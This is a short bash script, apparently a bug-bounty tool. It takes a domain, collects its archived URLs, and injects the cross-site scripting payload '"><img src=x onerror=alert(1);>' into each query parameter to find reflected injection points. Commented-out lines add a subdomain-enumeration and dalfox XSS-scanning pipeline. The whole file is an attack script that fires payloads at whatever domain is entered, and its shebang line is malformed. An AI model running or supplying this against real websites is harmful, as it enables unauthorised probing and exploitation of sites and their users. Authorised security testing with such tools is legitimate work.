#!usr/bin/bash

echo " My script ";

read -p "Enter domain name => " input
for i in ${input[@]}
do
echo "
.
.
.
scan started for $i
"

echo $i | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v "Not" >> $i.txt

#mkdir bugs/$i
#subfinder -d $i | httpx >> bugs/$i/subdomains.txt

#echo "XSS Hunting using gf and dalfox and xsstrike"
#waybackurls $i > bugs/$i/temp_waybackxss.txt
#cat bugs/$i/temp_waybackxss.txt | gf xss | sed 's/=.*/=/' | egrep -iv ".(jpg|jpeg|gif|tif|tiff|ico|pdf|svg|png|css|woff|woff2)" > bugs/$i/temp2_waybackxss.txt
#sort bugs/$i/temp2_waybackxss.txt | uniq -i > bugs/$i/waybackxss.txt
#cat bugs/$i/waybackxss.txt | dalfox pipe -o bugs/$i/dalfoxoutput.txt
#echo "XSSATACK FINISH"

done
